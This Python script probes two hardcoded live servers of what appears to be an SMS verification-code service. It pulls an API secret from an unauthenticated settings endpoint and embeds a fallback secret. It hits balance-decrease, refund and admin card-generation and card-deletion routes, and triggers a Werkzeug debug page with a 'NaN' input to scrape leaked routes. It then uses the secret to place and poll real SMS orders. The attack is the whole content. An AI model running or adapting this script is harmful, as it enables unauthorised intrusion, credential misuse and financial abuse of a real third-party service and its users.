#!/usr/bin/env python3
"""
一码快查 9110 + 8081 接口深度探测与映射

用法:
  python3 tools/api_deep_probe.py           # 全量探测
  python3 tools/api_deep_probe.py --9110    # 仅 Flask
  python3 tools/api_deep_probe.py --8081    # 仅 SMS
  python3 tools/api_deep_probe.py --json    # JSON 输出
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.request

MAIN = "http://43.154.128.116:9110"
SMS = "http://47.76.163.227:8081"


def req(
    host: str,
    method: str,
    path: str,
    body: dict | None = None,
    timeout: int = 8,
) -> dict:
    url = host + path
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    r = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        raw = resp.read().decode("utf-8", "replace")
        return {"status": resp.status, "body": raw[:500], "headers": dict(resp.headers)}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        return {"status": e.code, "body": raw[:500], "headers": dict(e.headers)}


def probe_9110() -> list[dict]:
    hits: list[dict] = []
    secret = None
    r = req(MAIN, "GET", "/api/desktop/settings?key=api_secret")
    m = re.search(r'"value":\s*"([^"]+)"', r["body"])
    if m:
        secret = m.group(1)

    tests: list[tuple[str, str, dict | None]] = [
        ("GET", "/api/desktop/settings?key=api_secret", None),
        ("GET", "/api/desktop/settings?key=deduct_amount", None),
        ("GET", "/api/desktop/settings?key=api_domain", None),
        ("GET", "/api/desktop/user-info?username=test", None),
        ("POST", "/api/desktop/login", {"username": "test", "password": "x"}),
        ("POST", "/api/desktop/register", {"username": "probe_x", "password": "x"}),
        ("POST", "/api/desktop/card-recharge", {"username": "test", "card_code": "x"}),
        ("POST", "/api/desktop/decrease-balance", {"username": "test", "amount": 3}),
        ("POST", "/api/desktop/refund-balance", {"username": "test", "amount": 0.01}),
        ("GET", "/login", None),
        ("GET", "/dashboard", None),
        ("GET", "/admin/users", None),
        ("GET", "/logout", None),
        ("POST", "/admin/delete-cards", {"codes": ["x"]}),
        ("POST", "/admin/generate-card", {"amount": 10}),
        ("OPTIONS", "/api/desktop/refund-balance", None),
    ]

    for method, path, body in tests:
        r = req(MAIN, method, path, body)
        if r["status"] == 404:
            continue
        snippet = r["body"].replace("\n", " ")[:120]
        if method == "GET" and r["status"] == 200 and "<!doctype" in snippet.lower():
            kind = "html"
        elif r["body"].strip().startswith("{"):
            kind = "json"
        else:
            kind = "text"
        hits.append(
            {
                "host": "9110",
                "method": method,
                "path": path,
                "status": r["status"],
                "kind": kind,
                "allow": r["headers"].get("Allow", ""),
                "snippet": snippet,
            }
        )

    # debugger route mining
    r = req(MAIN, "POST", "/api/desktop/decrease-balance", {"username": "test", "amount": "NaN"})
    if "Werkzeug Debugger" in r["body"]:
        routes = re.findall(r'@app\.route\(&#34;([^&#]+)&#34;', r["body"])
        funcs = re.findall(
            r'app\.py".*?line <em class="line">(\d+)</em>.*?function">([^<]+)',
            r["body"],
            re.S,
        )
        hits.append(
            {
                "host": "9110",
                "method": "DEBUG",
                "path": "/api/desktop/decrease-balance NaN",
                "status": 500,
                "kind": "debugger",
                "routes_leaked": routes,
                "funcs_leaked": [f"{ln}:{fn}" for ln, fn in funcs],
            }
        )

    return hits


def probe_8081() -> list[dict]:
    hits: list[dict] = []
    r = req(MAIN, "GET", "/api/desktop/settings?key=api_secret")
    m = re.search(r'"value":\s*"([^"]+)"', r["body"])
    secret = m.group(1) if m else "b9887333ae4c43858c9235e0ac4e0921"

    phone = f"139{int(time.time()) % 100000000:08d}"
    tests: list[tuple[str, str, dict | None]] = [
        ("POST", f"/create/{secret}", {"area": "86", "data": phone, "islink": False}),
        ("POST", f"/create/{secret}/", {"area": "86", "data": phone, "islink": False}),
        ("POST", f"/create/{secret}", {"area": "86", "data": phone, "islink": True}),
        ("GET", f"/query/{secret}/nonexist-order", None),
        ("GET", f"/setsms/{secret}/{phone}/123456", None),
        ("GET", "/swagger", None),
        ("GET", "/health", None),
    ]

    order_id = None
    for method, path, body in tests:
        r = req(SMS, method, path, body)
        if r["status"] == 404:
            continue
        hits.append(
            {
                "host": "8081",
                "method": method,
                "path": path.replace(secret, "{secret}"),
                "status": r["status"],
                "kind": "json" if r["body"].strip().startswith("{") else "text",
                "snippet": r["body"].replace("\n", " ")[:120],
            }
        )
        if method == "POST" and "/create/" in path and '"code":0' in r["body"]:
            om = re.search(r'"data":"([^"]+)"', r["body"])
            if om:
                order_id = om.group(1)

    if order_id:
        r = req(SMS, "GET", f"/query/{secret}/{order_id}")
        hits.append(
            {
                "host": "8081",
                "method": "GET",
                "path": "/query/{secret}/{order_id}",
                "status": r["status"],
                "kind": "json",
                "snippet": r["body"][:120],
                "note": "live order poll",
            }
        )

    return hits


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--9110", dest="only_9110", action="store_true")
    ap.add_argument("--8081", dest="only_8081", action="store_true")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    results: list[dict] = []
    if not args.only_8081:
        results.extend(probe_9110())
    if not args.only_9110:
        results.extend(probe_8081())

    if args.json:
        print(json.dumps(results, ensure_ascii=False, indent=2))
        return

    print("=== API Deep Probe ===\n")
    for h in results:
        host = h["host"]
        method = h["method"]
        path = h.get("path", "")
        status = h.get("status", "")
        if h.get("kind") == "debugger":
            print(f"[9110] DEBUGGER routes={h.get('routes_leaked')} funcs={h.get('funcs_leaked')}")
            continue
        allow = f" Allow={h['allow']}" if h.get("allow") else ""
        note = f" ({h['note']})" if h.get("note") else ""
        print(f"[{host}] {status:3} {method:7} {path[:55]:55}{allow} {h.get('snippet','')[:80]}{note}")
    print(f"\n共 {len(results)} 条命中；完整文档见 analysis/API_MAP.md")


if __name__ == "__main__":
    main()
